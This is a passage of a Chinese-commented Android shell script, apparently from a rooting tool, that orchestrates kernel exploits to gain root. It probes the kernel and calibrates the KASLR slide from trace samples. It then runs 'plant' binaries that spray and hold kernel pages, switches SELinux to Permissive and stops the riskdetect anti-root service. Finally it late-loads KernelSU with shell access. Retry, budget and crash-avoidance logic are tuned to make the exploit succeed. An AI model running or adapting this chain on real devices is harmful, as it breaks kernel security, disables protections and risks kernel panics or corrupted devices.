      echo "ENGINE_FAIL reason=base-calibration（引擎没认出内核基址）${_bl:+ $_bl}"
      echo "ADAPT_ENGINE_UNSUPPORTED: 这个内核 build 两条 6.12 引擎都过不了 base 校准（不是你的操作问题）；重试无意义，等引擎适配"
      diag_basecal
      printf '%s\n' "$SR" > "$ENG_BAD" 2>/dev/null
      rm -f "$ENG_HINT" 2>/dev/null
      return 1
    fi
    echo "ENGINE_FAIL reason=no-rootd enforce=$(getenforce 2>/dev/null)"
    return 1
  fi
  echo "ROOTD_READY: enforce=$(getenforce 2>/dev/null)"
  tlog ROOT

  # 照 参考引擎 run612.sh 的交接顺序：
  #   ① 只 stop riskdetect（单独一次连接，若在跑）
  #   ② install + late-load + 诊断，一条连接内完成
  #   ③ 3 秒内没等到 kernelsu → 换一次"不带 --kmi"的连接重试
  ROOTX="$T61269SU -c"
  RISK=$(getprop init.svc.riskdetect 2>/dev/null | tr -d '\r')
  echo "RISK_STATE=${RISK:-absent}"
  if [ "$ANTIROOT" = "1" ] && [ "$RISK" = "running" ]; then
    # 别打 "$?"：root_do 的输出都过了一次 sed/head，$? 取到的是管道最后那个命令的状态，
    # 不是 stop 本身的结果 —— 改成打完再看真实的服务状态（这才是能复核的证据）。
    root_do "stop riskdetect" | sed 's/^/  | /'
    echo "ANTIROOT_STOP: running->$(getprop init.svc.riskdetect 2>/dev/null | tr -d '\r')"
    echo "GUARD_ANTIROOT_OFF"
  else
    echo "ANTIROOT_SKIP state=${RISK:-absent}"
  fi
  if [ -z "$KSUD" ]; then
    echo "KSUD_MISSING"; PARTIAL=1; return 3
  fi
  echo "LATE_LOAD_CMD=$KSUD install; $KSUD late-load --kmi $KMI --allow-shell --package-name $MGR"
  root_do "$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --kmi $KMI --allow-shell --package-name $MGR; echo LATE_LOAD_RC=\$?; { [ -x /data/adb/ksu/bin/su ] && echo KSUD_SU_PRESENT || echo KSUD_SU_ABSENT; }; $KSUD debug info 2>&1 | head -n 12; logcat -d -s ksud 2>/dev/null | tail -n 20" | sed 's/^/  | /'
  i=0
  while [ $i -lt 15 ]; do have_mod && break; i=$((i+1)); sleep 0.2; done
  if ! have_mod; then
    echo "LATE_LOAD_RETRY: without --kmi"
    root_do "$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --allow-shell --package-name $MGR; echo LATE_LOAD_RC=\$?; { [ -x /data/adb/ksu/bin/su ] && echo KSUD_SU_PRESENT || echo KSUD_SU_ABSENT; }; logcat -d -s ksud 2>/dev/null | tail -n 20" | sed 's/^/  | /'
    i=0
    while [ $i -lt 15 ]; do have_mod && break; i=$((i+1)); sleep 0.2; done
  fi
  ROOTX=""
  # ★ 0.9.11：统一判据行（与 km612x 路径同款）
  echo "LATE_VERDICT: cand=$(ksud_sz "$KSUD")B live=$(have_mod && echo yes || echo no) installed=$(su_ok && echo yes || echo no)"
  if have_mod; then
    rm -f "$ENG_HINT" "$ENG_BAD" 2>/dev/null
    echo "KSU_LOADED"
    echo "MODULE_LOADED: $(mod_line)"
    return 0
  fi
  echo "ENGINE_FAIL reason=late-load-failed（rootd 保留，别 kill；重启后再试）"
  PARTIAL=1
  return 3
}

# ---------------------------------------------------------------- 模式 C：98260 慢速（回退）
run_slow() {
  SYMS=trsyms.txt
  PROF=""
  # ★ 慢链总预算：从**脚本启动**（T0）算起。
  #   必须在这里就定好 —— 后面"起 plant 之前"和"每轮采样之前"都要用它；
  #   以前只在"calib 没解出 slide"的分支里算，导致走缓存/calib 命中时它根本不存在。
  _sd=$(( T0 + ${KMROOT_SLOW_BUDGET:-1500} ))
  echo "SLOW_BUDGET=${KMROOT_SLOW_BUDGET:-1500}s（T0=${T0}s，截止 T=${_sd}s）"
  # 用 KBASE 判（和 App 侧 Cfg.symsFor / keepPayload 同一套口径），
  # 别再按字符串里有没有 "android16" 猜 —— 那是另一套规则，容易和落地的那份对不上。
  [ "$KBASE" = "612" ] && SYMS=trsyms_612.txt
  case "$SR" in
    *g9bc34d5b0c79*)  PROF=trprofile_pkj110.txt ;;
    *gc4127a25dcf3*)  SYMS=trsyms_pkh110.txt; PROF=trprofile_pkh110.txt ;;
  esac
  if [ -f /sdcard/kmroot-profile.txt ]; then PROF=/sdcard/kmroot-profile.txt; echo "PROFILE_USER=/sdcard/kmroot-profile.txt"; fi
  # 绝对路径不能加 ./ 前缀 —— 以前写成 [ -f "./$PROF" ]，于是 /sdcard/kmroot-profile.txt
  # 被拼成 "./sdcard/kmroot-profile.txt" 永远判不存在，用户自定义的 profile 被静默丢掉。
  case "$PROF" in
    "") : ;;
    /*) [ -f "$PROF" ] || { echo "PROFILE_MISS: $PROF 不存在，改用内置档案"; PROF=""; } ;;
    *)  [ -f "./$PROF" ] || { echo "PROFILE_MISS: $PROF 不存在，改用内置档案"; PROF=""; } ;;
  esac
  if [ -n "$KA" ] && [ -f "$KA/$SYMS" ]; then SYMS="$KA/$SYMS"; fi
  echo "KERNEL=$SR SYMS=$SYMS PROFILE=${PROF:-builtin}"

  # chmod 必须排在 [ -f ] 之前：执行位丢了的时候靠它自修
  [ -n "$ND" ] || chmod 755 kmplant kmsu kmsolve kmfork 2>/dev/null
  for f in "$TRPLANT" "$TRSU" "$TRSOLVE" "$TRFORK" "$TRSLIDE" "$SYMS"; do
    [ -f "$f" ] || { echo "DEPLOY_FAIL: 缺少载荷 $f（目录 $D / ND=$ND）"; echo "RESULT=FAIL"; echo DONE; exit 1; }
  done

  if plant_alive && [ -n "$BOOTID" ] && [ -f "$D/parked" ] && [ "$(cat "$D/parked" 2>/dev/null)" = "$BOOTID" ]; then
    echo "REBOOT_REQUIRED: 本次开机已 park（plant 仍存活），杀进程会触发野写；请重启手机后再试"
    echo "RESULT=REBOOT"; echo DONE; exit 9
  fi
  if ! plant_alive; then rm -f "$D/parked" 2>/dev/null; fi

  if timeout 5 "$TRSU" -c "id" 2>/dev/null | grep -q "uid=0"; then
    echo "TEMP_ROOT_ALREADY_READY"
    echo "ROOTD_READY"
    return 0
  fi


  echo "[1/5] probe"
  # 唯一没有 timeout 的引擎调用：probe 卡住会把整轮拖到 App 的 16 分钟预算之外，
  # 那样 App 只能 live.kill()，一条 RESULT 都拿不到（界面误报"Shizuku 被回收"）。
  timeout 90 "$TRPLANT" --probe > probe.log 2>&1
  PRC=$?
  tail -n 12 probe.log 2>/dev/null
  if ! grep -q "PROBE_OK" probe.log 2>/dev/null; then
    echo "PROBE_FAIL rc=$PRC"
    # ★ 0.8.42：同 6.12 分支 —— 内核串没适配（kernel mismatch）是"不支持"，不是"失败"。
    if grep -q "REASON=kernel mismatch" probe.log 2>/dev/null; then
      echo "KERNEL_MISMATCH: 98260 慢链的 plant 没有本机内核的档案（探针直接判 kernel mismatch）"
      echo "RESULT=UNSUPPORTED"; echo DONE; exit 0
    fi
    echo "RESULT=FAIL"; echo DONE; exit 11
  fi
  echo "PROBE_OK"

  echo "[2/5] slide"
  SLIDE=""
  CACHE="$D/slide.cache"
  if [ -f "$CACHE" ]; then
    read -r CB CS < "$CACHE"
    if [ "$CB" = "$BOOTID" ] && [ -n "$CS" ]; then SLIDE=$CS; echo "SLIDE_CACHE=$SLIDE"; fi
  fi
  if [ -z "$SLIDE" ]; then
    OUT=$(timeout 120 "$TRPLANT" --calib-slide 2>&1)
    echo "$OUT" | grep -E "SLIDE=|CALIB|PROFILE|PROFILE_ERR|PROBE_KERNEL" | tail -n 4
    SLIDE=$(echo "$OUT" | sed -n 's/.*SLIDE=\(0x[0-9a-fA-F]*\).*/\1/p' | head -n 1)
  fi
  if [ -n "$SLIDE" ]; then
    echo "SLIDE=$SLIDE (cached/call-site)"
  else
    echo "SLIDE_CALIB_MISS: call site 未解出，回退采样"
    # 慢链必须自带总预算：3 轮采样 3×(260+150)=20.5 分钟，全部跑完会超过 App 的总预算，
    # 那样 App 只能 live.kill() → 一条 RESULT 都拿不到（界面误报"运行中断"），
    # trslide 起的 8 个 cat trace_pipe_raw 还会变成孤儿一直吃 trace 缓冲。
    # 预算 `_sd` 已在 run_slow 开头按 T0 算好（从脚本启动算起，含 wait_env/probe/calib）。
    ROUND=1; LAST=""; SAME=0
    while [ $ROUND -lt 4 ]; do
      _sn=$(now_s); [ -n "$_sn" ] || _sn=0
      if [ "$_sn" -ge "$_sd" ]; then
        echo "SLOW_BUDGET_HIT: 慢链已跑到 ${KMROOT_SLOW_BUDGET:-1500}s 总预算（T_${_sn}s/${_sd}s），停止采样"
        break
      fi
      echo "SAMPLE_ROUND=$ROUND"
      # 必须把 forker 的真实路径传下去：载荷落地名是 kmfork（ND 模式是 libkmfork.so），
      # trslide.sh 原来写死 $D/kmfork —— 那个文件不存在，采样一次都不会成功。
      KMSLIDE_DIR="$D" TRFORK="$TRFORK" ND="$ND" timeout 260 sh "$TRSLIDE" > sample.log 2>&1
      tail -n 4 sample.log 2>/dev/null | sed 's/^/  | /'
      RES=$(timeout 150 "$TRSOLVE" . "$SYMS" 2>&1)
      echo "$RES" | grep -E "slide=|no slide candidate|syms=" | head -n 3 | sed 's/^/  | /'
      SV=$(echo "$RES" | sed -n 's/.*slide=\(0x[0-9a-fA-F]*\).*/\1/p' | head -n 1)
      VV=$(echo "$RES" | sed -n 's/.*votes=\([0-9][0-9]*\).*/\1/p' | head -n 1)
      AV=$(echo "$RES" | sed -n 's/.*anchors=\([0-9][0-9]*\).*/\1/p' | head -n 1)
      OV=$(echo "$RES" | sed -n 's/.*observed=\([0-9][0-9]*\).*/\1/p' | head -n 1)
      [ -n "$VV" ] || VV=0; [ -n "$AV" ] || AV=0; [ -n "$OV" ] || OV=0
      echo "SAMPLE_RESULT round=$ROUND slide=${SV:-none} votes=$VV anchors=$AV observed=$OV"
      if [ -n "$SV" ]; then
        if [ "$SV" = "$LAST" ]; then SAME=$((SAME+1)); else SAME=1; LAST=$SV; fi
        if [ "$AV" -ge 10 ] && [ "$OV" -ge 400 ]; then
          SLIDE=$SV; echo "SLIDE_ACCEPT round=$ROUND votes=$VV anchors=$AV observed=$OV"; break
        fi
        if [ $ROUND -ge 3 ] && [ $SAME -ge 3 ]; then SLIDE=$SV; echo "SLIDE_3ROUND=$SLIDE"; break; fi
      fi
      ROUND=$((ROUND+1))
    done
  fi
  if [ -z "$SLIDE" ] || [ "$SLIDE" = "0x0" ] || [ "$SLIDE" = "0" ]; then
    echo "SOLVE_FAIL: KASLR slide 样本不足"
    echo "RESULT=FAIL"; echo DONE; exit 12
  fi
  [ -n "$BOOTID" ] && echo "$BOOTID $SLIDE" > "$CACHE" 2>/dev/null
  echo "SLIDE_READY=$SLIDE"

  echo "[3/5] plant (slide=$SLIDE)"
  pkill -9 -f kmplant 2>/dev/null
  rm -f plant.log /data/local/tmp/km9826-root.sock 2>/dev/null
  PP=""
  if [ -n "$PROF" ]; then
    { cat "$PROF"; echo "release = $SR"; } > "$D/active.profile" 2>/dev/null \
      && PP="--profile $D/active.profile" || echo "WARN=profile-write-failed"
  fi
  KARGS=""
  # 用 select_ksud 选出来的那个（优先管理器自带 / 从管理器 APK 解出来的），
  # 否则模块版本和管理器对不上、KSU 管理器会红字「需要更新内核」—— 0.8.8 专门修的就是这件事，
  # 但这里以前写死成内置的 $D/ksud，等于把慢链又退回了旧行为。
  if [ -n "$KSUD" ] && [ -x "$KSUD" ]; then
    KARGS="--ksu $KSUD"; echo "KSUD_LATE_LOAD=selected:$KSUD_SRC ($KSUD)"
  elif [ -x "$D/ksud" ]; then
    KARGS="--ksu $D/ksud"; echo "KSUD_LATE_LOAD=builtin"
  elif [ -n "$ND" ] && [ -x "$ND/libksud.so" ]; then
    KARGS="--ksu $ND/libksud.so"; echo "KSUD_LATE_LOAD=nd"
  fi
  PLANTSEC=${KMROOT_SLOW_PLANT_BUDGET:-240}
  # 起 plant 之前再看一眼总预算：只剩不到 plan 窗口时没必要再起（起了也会被 App 杀掉、
  # 而且 plant 一起就进入"持页/需要冷重启"的赌局，空跑代价很大）。
  _sn=$(now_s); [ -n "$_sn" ] || _sn=0
  if [ "$_sn" -ge $(( _sd - PLANTSEC )) ] 2>/dev/null; then
    echo "SLOW_BUDGET_HIT: 剩余时间不足一个 plant 窗口（T_${_sn}s / 预算 ${_sd}s），本轮不再起 plant"
    echo "RESULT=FAIL"; echo DONE; exit 13
  fi
  setsid sh -c "$TRPLANT --slide $SLIDE $PP $KARGS --budget $PLANTSEC > plant.log 2>&1 < /dev/null" &
  ROOTED=0
  i=0
  # 轮询窗口必须 ≥ plant 自己的 --budget（+15s 余量）。以前写死 200s < 240s：
  # 200~240s 之间才 ROOTD_LISTEN 的**成功**轮次会被判成 "plant 还活着 → PARKED"，
  # 还会落 $D/parked 标记，于是下一次点击直接 RESULT=REBOOT，把用户锁到冷重启。
  while [ $i -lt $((PLANTSEC + 15)) ]; do
    if grep -q "ROOTD_LISTEN" plant.log 2>/dev/null; then ROOTED=1; break; fi
    if grep -q "KSU_OK=1" plant.log 2>/dev/null; then ROOTED=1; break; fi
    # kmplant 打的是 "PARKED=1"，"parking" 是 kmfast/km612 的措辞 —— 两个都要认。
    # （原来只 grep "parking"，对 kmplant 永远不命中，等于这条提前退出形同虚设。）
    if grep -qE "PARKED=1|parking" plant.log 2>/dev/null; then break; fi
    plant_alive || break
    sleep 1
    i=$((i+1))
    if [ $((i % 10)) -eq 0 ]; then tail -n 2 plant.log 2>/dev/null | sed 's/^/  | /'; fi
  done
  tail -n 10 plant.log 2>/dev/null
  if [ "$ROOTED" != "1" ]; then
    if grep -qE "PARKED=1|parking" plant.log 2>/dev/null; then
      echo "PLANT_PARKED: 本轮 miss，plant 仍存活（持有 zombie，不要 kill）"
      [ -n "$BOOTID" ] && echo "$BOOTID" > "$D/parked"
      echo "RESULT=PARKED"; echo DONE; exit 13
    fi
    if plant_alive; then
      # 日志里没有 PARKED=1、但 plant 自己的预算都过了进程还在：保守按"持页"处理。
      # 宁可让用户多冷重启一次，也不要在同一个 boot 上二次喷洒（野写/panic 风险）。
      echo "PLANT_ALIVE_UNKNOWN: 等到 ${PLANTSEC}s，进程仍在但日志没打 PARKED=1 → 按持页保守处理（不 kill）"
      [ -n "$BOOTID" ] && echo "$BOOTID" > "$D/parked"
      echo "RESULT=PARKED"; echo DONE; exit 13
    fi
    echo "PLANT_FAIL: 未出现 ROOTD_LISTEN"
    echo "RESULT=FAIL"; echo DONE; exit 13
  fi
  echo "ROOTD_LISTEN"

  echo "[4/5] verify rootd"
  ID=$(timeout 10 "$TRSU" -c "id" 2>&1)
  case "$ID" in *uid=0*) ;; *) ID2=$(timeout 10 "$TRSU" "id" 2>&1); [ -n "$ID2" ] && ID=$ID2 ;; esac
  echo "ROOTD_ID=$ID"
  case "$ID" in
    *uid=0*) echo "ROOTD_READY"; PARTIAL=1 ;;
    *) echo "ROOTD_WARN: rootd 未返回 uid=0" ;;
  esac

  ROOTX="$TRSU -c"
  guard_off

  echo "[5/5] ksu status"
  if have_mod; then
    echo "KSU_MODULE=live"
  else
    echo "KSU_MODULE=absent"
    late_load | sed 's/^/  | /'
  fi
  grep -q "KSU_OK=1" plant.log 2>/dev/null && echo "KSU_OK=1"
  ROOTX=""
  if have_mod; then echo "KSU_LOADED"; else echo "KSU_MISSING"; fi
  return 0
}

# 上一次内核 panic 的现场（pstore）趁现在有 root 保存到工作目录：/data/local/tmp 重启不丢，
# 这样"崩了却没 trace"的死结就解开了（shell 域平时读不到 /sys/fs/pstore）
dump_pstore() {
  root_q "cd '$D' 2>/dev/null; for f in /sys/fs/pstore/*; do [ -f \"\$f\" ] || continue; b=\$(basename \"\$f\"); base64 \"\$f\" > \"pstore_\$b.b64\" 2>/dev/null; done; true"
  _n=$(ls "$D"/pstore_*.b64 2>/dev/null | wc -l | tr -d ' ')
  echo "PSTORE_SAVED=${_n:-0}"
}

# loadavg 是小数（如 12.53）。以前用 `tr -d '.'` 把它变成 1253 再和 1200 比 —— 于是 12.53
# 被当成 1.253 直接放行，环境门在最该拦的时候（系统正忙）完全形同虚设。这里按 ×100 正确取整。
ld100() {
  _l=$1
  [ -n "$_l" ] || { echo 0; return; }
  _ip=${_l%%.*}
  _fp=${_l#*.}
  if [ "$_fp" = "$_l" ]; then _fp=00; fi
  case ${#_fp} in
    0) _fp=00 ;;
    1) _fp="${_fp}0" ;;
    *) _fp=$(printf '%s' "$_fp" | cut -c1-2) ;;
  esac
  [ -n "$_ip" ] || _ip=0
  echo $(( _ip * 100 + _fp ))
}

# 环境门：刚开机就跑会 burst miss（实测 34s/load 20 时 free_seen=1 但 burst hit=0 3166ms）
# 只等不拦：最多等 WAIT_MAX 秒，等不到也照跑（并打警告），因为用户可能就想试
#
# ★★ 0.8.18 大改：与 参考引擎 对齐 —— **它根本没有环境门**（dex 里没有 uptime/loadavg/thermal 相关逻辑，
#   拷完载荷直接 `setsid ./kmfast fake &`）。我们原来的门是"uptime≥90s 且 idle≥20%/load≤12"，
#   等于用户点下去可能白等 90 秒 —— 这就是"我们比他慢"的主要体感来源。
#   现在只保留一个**极小**的保护：仅在「开机不到 MIN_UP 秒」这种极端早期才短暂等，
#   且最多等 WAIT_MAX 秒；超过就照跑。想回到老行为：KMROOT_MIN_UPTIME=90 KMROOT_WAIT_ENV=90。
wait_env() {
  # ★ 0.9.5：门槛从 30s 提到 100s —— 有实测依据，不是拍脑袋：
  #   PME110（6.12.69 第二构建）在 uptime=45s 跑，churn 三轮全 miss、直接 park；
  #   同一台在 uptime=108s 跑，第一轮就 free_seen=1 burst hit=1（279ms），一路到 uid=0。
  #   刚开机时系统自己在大批分配/释放，抢页窗口被启动噪声冲掉。
  #   想快可以 touch /sdcard/kmroot-force 跳过。
  MIN_UP=${KMROOT_MIN_UPTIME:-100}
  MAX_LOAD=${KMROOT_MAX_LOAD:-12}
  WAIT_MAX=${KMROOT_WAIT_ENV:-120}
  [ -f /sdcard/kmroot-force ] && { echo "ENV_GATE=FORCED（/sdcard/kmroot-force）"; return 0; }
  _up0=$(cut -d. -f1 /proc/uptime 2>/dev/null); [ -n "$_up0" ] || _up0=0
  # 绝大多数情况（开机超过 30s）直接放行 —— 与 参考引擎 的"不等待"一致
  if [ "$_up0" -ge "$MIN_UP" ]; then
    echo "ENV_GATE=SKIP uptime=${_up0}s (>=${MIN_UP}s，系统已稳定，直接跑)"
    return 0
  fi
  w=0
  _idle=0
  while [ $w -lt "$WAIT_MAX" ]; do
    _up=$(cut -d. -f1 /proc/uptime 2>/dev/null); [ -n "$_up" ] || _up=0
    _ld=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null); [ -n "$_ld" ] || _ld=0
    _ldi=$(ld100 "$_ld")
    set -- $(head -n1 /proc/stat); shift
    _i1=$(( $4 + $5 )); _t1=0; for _x in $@; do _t1=$(( _t1 + _x )); done
    sleep 0.3
    set -- $(head -n1 /proc/stat); shift
    _i2=$(( $4 + $5 )); _t2=0; for _x in $@; do _t2=$(( _t2 + _x )); done
    _dt=$(( _t2 - _t1 )); [ "$_dt" -gt 0 ] || _dt=1
    _idle=$(( ( _i2 - _i1 ) * 100 / _dt ))
    if [ "$_up" -ge "$MIN_UP" ]; then
      echo "ENV_GATE=OK uptime=${_up}s load=${_ld} idle=${_idle}% (刚开机，等了 ${w}s)"
      return 0
    fi
    echo "WAIT_ENV uptime=${_up}s load=${_ld} idle=${_idle}% (刚开机不到 ${MIN_UP}s，最多等 ${WAIT_MAX}s；已等 ${w}s)"
    sleep 4
    w=$((w + 4))
  done
  echo "ENV_GATE=WARN: 刚开机只等到 ${w}s（uptime=${_up}s），照跑"
  return 0
}
# 自愈：有些机器被旧版本 `pm disable-user` 过（表现：截不了图、部分应用从桌面消失）。
# ★ disable-user 是**持久化**的（写进 /data/system/users/0/package-restrictions.xml），重启不恢复，
#   所以"重启也不能"就是这一类，和本版本无关（0.8.6 起已不再 disable 任何系统包）。
# ★★ 0.8.17 补的三件事（缺一件用户就以为"修了没用"）：
#   ① 还有一种残留是 `pm uninstall --user 0` —— 它**不出现在 `pm list packages -d`** 里，
#      只能从 `pm list packages -u`（含已卸载）看出来，修法是 `pm install-existing --user 0`；
#   ② **判据是功能态不是配置态**：`color_screenshot` 服务在不在（`service list`），而不是包是否 enabled；
#   ③ 该服务由 com.oplus.exsystemservice 在**开机广播 LOCKED_BOOT_COMPLETED 时注册** ——
#      `pm enable` 之后**必须重启一次**才生效，手动重启进程无效。所以这里要明确打 NEED_REBOOT。
# `pm enable` / `pm install-existing` 都**不需要 root**（uid 2000 就够），失败才走 root 通道。
# ---------------------------------------------------------------- 相机 HAL 复位（0.8.81）
# 2026-11-06 用户反馈：X8U 拿到 root 后「变焦失效」，用 KSU 模块
#   `OPPO_Find_X8_Ultra_Camera_Fix_Action_KSU`（id=camera_fix_action v1.2，550 B）可恢复。
# 那个模块的 action.sh 全文只有两件事：
#     killall vendor.qti.camera.provider-service_64
#     sleep 3
# 也就是说：**它修的就是"相机 HAL 卡住"**。这一步本来就该在"拿到 root 之后"做，
# 所以直接并进收尾流程，用户不必再额外装模块、也不用手动点模块的 action。
# 关闭方式：建空文件 /sdcard/kmroot-no-camera-reset
camera_hal_reset() {
  [ -f /sdcard/kmroot-no-camera-reset ] && { echo "CAMERA_HAL_RESET_SKIP: /sdcard/kmroot-no-camera-reset"; return 0; }
  su_ok || { echo "CAMERA_HAL_RESET_SKIP: 当前没有 su（没拿到 root 时不该动相机）"; return 0; }
  _hit=0
  for _p in vendor.qti.camera.provider-service_64 vendor.qti.camera.provider-service_64-1 \
            vendor.qti.camera.provider vendor.mediatek.hardware.camera.provider-service_64 \
            vendor.mediatek.hardware.camera.provider@2.4-service camera.provider-service; do
    if pidof "$_p" >/dev/null 2>&1; then
      root_do "killall $_p" 2>/dev/null | sed 's/^/  | /'
      echo "CAMERA_HAL_RESET: killed=$_p"
      _hit=1
    fi
  done
  if [ "$_hit" = "1" ]; then
    echo "CAMERA_HAL_RESET_WAIT: 相机 HAL 会在几秒内自动重启，变焦随之恢复（等同那个模块的 action）"
    sleep 3
  else
    echo "CAMERA_HAL_RESET_NONE: 未发现已知相机 HAL 进程名（本机可能不是同款 ROM）"
  fi
}

self_heal_guard() {
  _healed=0
  _dis=$(pm list packages -d --user 0 2>/dev/null | tr -d '\r')
  _uni=$(pm list packages -u 2>/dev/null | sed 's/^package://' | tr -d '\r')
  _ins=$(pm list packages 2>/dev/null | sed 's/^package://' | tr -d '\r')
  for _p in com.oplus.exsystemservice com.oplus.screenshot; do
    if printf '%s\n' "$_dis" | grep -qx "package:$_p"; then
      echo "SELF_HEAL: $_p 处于禁用状态 → 重新启用"
      pm enable --user 0 "$_p" 2>/dev/null | sed 's/^/  | /'
      if printf '%s\n' "$(pm list packages -d --user 0 2>/dev/null | tr -d '\r')" | grep -qx "package:$_p"; then
        root_do "pm enable --user 0 $_p" 2>/dev/null | sed 's/^/  | /'
      fi
      _healed=$((_healed+1))
    elif printf '%s\n' "$_uni" | grep -qx "$_p" && ! printf '%s\n' "$_ins" | grep -qx "$_p"; then
      echo "SELF_HEAL: $_p 被对当前用户卸载 → 重新安装"
      pm install-existing --user 0 "$_p" 2>/dev/null | sed 's/^/  | /'
      if ! printf '%s\n' "$(pm list packages 2>/dev/null | sed 's/^package://')" | grep -qx "$_p"; then
        root_do "pm install-existing --user 0 $_p" 2>/dev/null | sed 's/^/  | /'
      fi
      _healed=$((_healed+1))
    fi
  done
  _svc=$(service list 2>/dev/null | grep -c color_screenshot)
  echo "SELF_HEAL_SVC: color_screenshot=$_svc healed=$_healed"
  if [ "$_healed" -gt 0 ] && [ "$_svc" -eq 0 ]; then
    echo "SELF_HEAL_NEED_REBOOT: 组件已修好，但截图服务只在开机时注册（LOCKED_BOOT_COMPLETED）—— 必须重启手机一次才生效"
  else
    echo "SELF_HEAL_DONE"
  fi
}

# ---------------------------------------------------------------- 6.12 慢速（参考引擎 的 98260 实现）
# 我们自己的 98260 链（kmplant）在 6.12 上因 slab order=0 必挂；参考引擎 的那套慢链 plant 是另一套
# 实现（2.1MB，--auto 自己算 slide），这里按 参考引擎 run98260.sh 的流程走一遍。
run_slow612() {
  echo "[6.12-slow] 参考引擎 98260 兼容链"
  # chmod 在 -x 之前（执行位丢了才救得回来；原来 run_slow612 根本没 chmod）
  [ -n "$ND" ] || chmod 755 kmslow kmslowsu 2>/dev/null
  [ -x "$T98260P" ] || { echo "ENGINE_FAIL reason=missing-kmslow ($T98260P)"; return 12; }
  [ -x "$T98260S" ] || { echo "ENGINE_FAIL reason=missing-kmslowsu ($T98260S)"; return 12; }
  SOCK2=/data/local/tmp/km9826-root.sock
  if pidof kmslow >/dev/null 2>&1 || pidof libkmslow.so >/dev/null 2>&1; then
    echo "STALE_PLANT: 上一次的 kmslow 还在跑 → 冷重启后再试"
    return 2
  fi
  rm -f plant612.log "$SOCK2" 2>/dev/null
  echo "[1/3] probe"
  timeout 30 "$T98260P" --probe > probe612.log 2>&1
  _prc=$?
  tail -n 3 probe612.log 2>/dev/null | sed 's/^/  | /'
  if [ $_prc -ne 0 ]; then
    echo "PROBE_FAIL rc=$_prc"
    # ★ 0.8.42：探针明确报 `REASON=kernel mismatch` = 这台机的内核串没适配（plant 里只带
    #   `6.18.21-android17-5-g…` 那份档案），**重试一万次也不会变**，不能归成"运行失败"，
    #   更不能让 App 的兜底文案说成"脚本损坏"。直接给 UNSUPPORTED。
    if grep -q "REASON=kernel mismatch" probe612.log 2>/dev/null; then
      echo "KERNEL_MISMATCH: 慢速 98260 的 plant 没有本机内核的档案（探针直接判 kernel mismatch）"
      echo "RESULT=UNSUPPORTED"; echo DONE; exit 0
    fi
    PARTIAL=0; return 1
  fi
  echo "[2/3] plant --auto（SELinux 命中后变 Permissive）"
  P612SEC=${KMROOT_98260_BUDGET:-240}
  setsid sh -c "exec \"$T98260P\" --auto --budget $P612SEC > plant612.log 2>&1 < /dev/null" &
  i=0
  ROOTED=0
  # 轮询次数按 --budget 换算（0.3s/次）：以前写死 1100 次 = 330s，比 plant 自己的 240s 多等 90s
  while [ $i -lt $(iter_for "$P612SEC") ]; do
    sleep 0.3
    i=$((i+1))
    if grep -qm1 "ROOTD_READY" plant612.log 2>/dev/null; then ROOTED=1; break; fi
    if grep -qm1E "FAIL=(task|selinux|cred|init|probe)|PARKED=1" plant612.log 2>/dev/null; then break; fi
    ( pidof kmslow >/dev/null 2>&1 || pidof libkmslow.so >/dev/null 2>&1 ) || { sleep 1; grep -qm1 "ROOTD_READY" plant612.log 2>/dev/null && ROOTED=1; break; }
  done
  if [ "$ROOTED" != "1" ]; then
    echo "ENGINE_LOG_FULL:"
    tail -n 20 plant612.log 2>/dev/null | sed 's/^/  | /'
    if grep -q "PARKED=1\|parking without reap" plant612.log 2>/dev/null; then
      set_held
      echo "FAST_PARKED: 慢链本轮 miss，进程持页，别 kill"
      return 2
    fi
    echo "ENGINE_FAIL reason=98260-plant-failed enforce=$(getenforce 2>/dev/null)"
    return 1
  fi
  echo "PLANT_OK: enforce=$(getenforce 2>/dev/null) rootd ready"
  if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
    echo "ENGINE_FAIL reason=not-permissive"
    return 1
  fi
  tlog ROOT
  [ -n "$KSUD" ] || { echo "KSUD_MISSING"; PARTIAL=1; return 3; }
  echo "[3/3] late-load（KMI=${KMI:-android16-6.12}）"
  ROOTX="$T98260S -c"
  echo "LATE_LOAD_CMD=$KSUD install; $KSUD late-load --kmi ${KMI:-android16-6.12} --allow-shell --package-name $MGR"
  root_do "$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --kmi ${KMI:-android16-6.12} --allow-shell --package-name $MGR; echo LATE_LOAD_RC=\$?; { [ -x /data/adb/ksu/bin/su ] && echo KSUD_SU_PRESENT || echo KSUD_SU_ABSENT; }; logcat -d -s ksud 2>/dev/null | tail -n 15" | sed 's/^/  | /'
  i=0
  while [ $i -lt 15 ]; do have_mod && break; i=$((i+1)); sleep 0.2; done
  if ! have_mod; then
    echo "LATE_LOAD_RETRY: without --kmi"
    root_do "$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --allow-shell --package-name $MGR; echo LATE_LOAD_RC=\$?; { [ -x /data/adb/ksu/bin/su ] && echo KSUD_SU_PRESENT || echo KSUD_SU_ABSENT; }" | sed 's/^/  | /'
    i=0
    while [ $i -lt 15 ]; do have_mod && break; i=$((i+1)); sleep 0.2; done
  fi
  ROOTX=""
  # ★ 0.9.11：统一判据行（与 km612x 路径同款）
  echo "LATE_VERDICT: cand=$(ksud_sz "$KSUD")B live=$(have_mod && echo yes || echo no) installed=$(su_ok && echo yes || echo no)"
  if have_mod; then
    echo "KSU_LOADED"
    echo "MODULE_LOADED: $(mod_line)"
    return 0
  fi
  echo "ENGINE_FAIL reason=late-load-failed（rootd 保留，别 kill）"
  PARTIAL=1
  return 3
}

# ---------------------------------------------------------------- 模式 A0：Ace 5 竞速版 ic 核心
# 逆向结论（一加 Ace 5 竞速版 C17 / 6.1.157-android14-11-o-ga05da223fb30）：
#   参考实现的引擎是自包含的：内建 STATIC_TIMER_SITE=0xffffffc00859ab50，
#   运行时按 low21=0x19ab50 校准站点，并按 uname -r 的 build 串校验 ic-syms 表；
#   拿到 fake cred 后保留 kernel 上下文与全 cap，再由 PAYLOAD_CMD 把 root 交给管理器。
# 本适配把这套链路接进 trrun.sh：
#   * 核心以 libicace5.so 放 jniLibs（extractNativeLibs=true → 安装即解到
#     nativeLibraryDir 且 0755，这是 App 域把可执行文件落地的既有做法）；
#   * 符号表内嵌在本脚本（base64），运行时落到 $D/ic-syms.txt；
#   * payload 复用 KMRoot 自己的 ksud late-load 阶梯，避免再搬一份外部 handoff。
